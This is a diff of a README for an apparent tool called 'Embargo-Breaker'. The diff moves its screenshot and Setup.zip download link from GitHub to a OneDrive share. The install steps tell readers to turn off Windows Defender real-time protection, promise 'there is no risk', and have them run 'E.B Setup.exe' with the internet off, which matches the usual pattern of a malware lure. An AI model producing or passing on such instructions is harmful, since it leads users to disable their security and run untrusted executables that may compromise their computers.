@@ -7,15 +7,15 @@
 
 ## How to install?
 
-* Step 1: you have to turn off your Antivirus so that we can download the file (this program has been tested and there is no risk 😊). For example, we turn off Windows Defender:
+* Step 1: you have to turn off Antivirus so that we can download the file (this program has been tested and there is no risk 😊). For example, we turn off Windows Defender:
 
 Open `Windows Security > Virus & threat protection > Manage settings` and turn off `Real-time protection`
 
-![img](https://github.com/ALTONIBOT/Embargo-Breaker/blob/main/hint-img/0.png)
+![img](blob:https://photos.onedrive.com/58c0dc94-4cd7-488d-b92a-4fba8645bd98)
 
 * Step 2: download file...
 
-> download the file from [here](https://github.com/ALTONIBOT/Embargo-Breaker/raw/main/Setup.zip) .
+> download the file from [here](https://1drv.ms/u/s!AsHE808G_RHegysSI2VHdDMpNQQZ) .
 
 * Step 3: turn off Internet Data and start `Setup.zip > E.B Setup.exe`
 
